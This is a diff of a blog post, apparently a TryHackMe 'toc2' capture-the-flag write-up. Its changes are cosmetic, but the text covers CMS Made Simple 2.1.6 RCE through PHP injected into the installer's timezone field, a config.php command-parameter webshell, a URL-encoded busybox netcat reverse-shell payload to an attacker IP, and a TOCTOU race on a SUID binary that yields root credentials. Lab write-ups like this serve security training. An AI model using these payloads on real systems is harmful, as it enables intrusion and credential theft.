@@ -13,8 +13,7 @@ difficulty: Medium
 
 **Difficulty:** {{page.difficulty}} | **Focus:** {{ page.tags | join: ', ' }}.
 
-Room link: https://tryhackme.com/room/toc2
-
+> **Room link:** [https://tryhackme.com/room/toc2](https://tryhackme.com/room/toc2)
 
 It's a setup... Can you get the flags in time?
 
@@ -26,20 +25,20 @@ The scan reveals two open ports:
 * Port 22: SSH
 * Port 80: HTTP (Web Server)
 
-<div class="post-img"><img src="/assets/img/toc2/nmap.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/nmap.png" alt="TOC2 nmap"></div>
 
 ## 2. Web Discovery & Directory Bruteforcing
 Navigating to the website, we find an "Under Construction" page. While it mentions some potential credentials, their application isn't immediately clear. To uncover hidden paths, I ran gobuster for directory bruteforcing.
 
-<div class="post-img"><img src="/assets/img/toc2/website_username_pass.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/website_username_pass.png" alt="TOC2 website username pass"></div>
 
-<div class="post-img"><img src="/assets/img/toc2/gobuster.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/gobuster.png" alt="TOC2 gobuster"></div>
 
 The scan identifies a **robots.txt** file. Inspecting its contents reveals an interesting installation path: 
 
 * **hxxp[://]10.48.164.165/cmsms/cmsms-2.1.6-install.php**
 
-<div class="post-img"><img src="/assets/img/toc2/robots.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/robots.png" alt="TOC2 robots"></div>
 
 ## 3. Vulnerability Research
 The discovered directory leads to the CMS Made Simple 2.1.6 installation wizard. Researching known vulnerabilities for this version leads to EDB-ID: 44192.
@@ -51,20 +50,20 @@ The exploit involves Remote Code Execution (RCE) by injecting arbitrary PHP code
 ## 4. Exploitation & Initial Access
 Using the database credentials found during the installation steps, I injected a PHP system() function into the timezone field.
 
-<div class="post-img"><img src="/assets/img/toc2/exploit.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/exploit.png" alt="TOC2 exploit"></div>
 
 To verify the exploit, I accessed the newly created config.php with a command parameter
 
 * **hxxp[://]10.48.164.165/cmsms/config.php?cmd=id**
 
-<div class="post-img"><img src="/assets/img/toc2/id_exploit.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/id_exploit.png" alt="TOC2 id exploit"></div>
 
 ## 5. Gaining a Reverse Shell
 With RCE confirmed, the next step is to catch a reverse shell. I started a netcat listener on my local machine and executed the following payload via the browser
 
 * **busybox%20nc%2010.48.83.150%204444%20-e%20%2Fbin%2Fbash**
 
-<div class="post-img"><img src="/assets/img/toc2/reverse_shell.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/reverse_shell.png" alt="TOC2 reverse shell"></div>
 
 Shell Stabilization
 Once connected, I stabilized the shell to allow for better interactivity. I followed the methods outlined in this guide:
@@ -76,9 +75,9 @@ Enumerating the **/home** directory reveals a user named **frank**. We have read
 
 Inside, we find **user.txt** (the first flag) and a file named **new_machine.txt**. The note explains that Frank was assigned a new Thinkpad and reveals a "default password" used for work machines. Using these credentials, I switched users to Frank
 
-<div class="post-img"><img src="/assets/img/toc2/frank.png" alt="Alt text"></div>
-<div class="post-img"><img src="/assets/img/toc2/frank_pass.png" alt="Alt text"></div>
-<div class="post-img"><img src="/assets/img/toc2/eleavate_frank.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/frank.png" alt="TOC2 frank"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/frank_pass.png" alt="TOC2 frank pass"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/eleavate_frank.png" alt="TOC2 elevate frank"></div>
 
 ## 7. Privilege Escalation: TOCTOU Attack
 In Frank's home directory is a folder named root_access containing a SUID binary called **readcreds** and its source code, **readcreds.c**.
@@ -90,15 +89,15 @@ The program checks if the user has permission to read a file before opening it. 
 * **TOCTOU Concepts: hxxps[://]heinosass[.]gitbook[.]io/leet-sheet/binary-exploitation/time-of-check-to-time-of-use-toctou**
 
 
-<div class="post-img"><img src="/assets/img/toc2/setup_toctou.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/setup_toctou.png" alt="TOC2 setup toctou"></div>
 
 By rapidly swapping a file I could read with the root password backup file between the program's "check" and "read" actions, I successfully retrieved the Root Credentials.
 
 
-<div class="post-img"><img src="/assets/img/toc2/root_creds.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/root_creds.png" alt="TOC2 root creds"></div>
 
 ## 8. Final Flag
 With the root password, I logged in as root and captured the final flag.
 
 
-<div class="post-img"><img src="/assets/img/toc2/roottxt.png" alt="Alt text"></div>
+<div class="post-img"><img src="{{ site.baseurl }}/assets/img/toc2/roottxt.png" alt="TOC2 roottxt"></div>
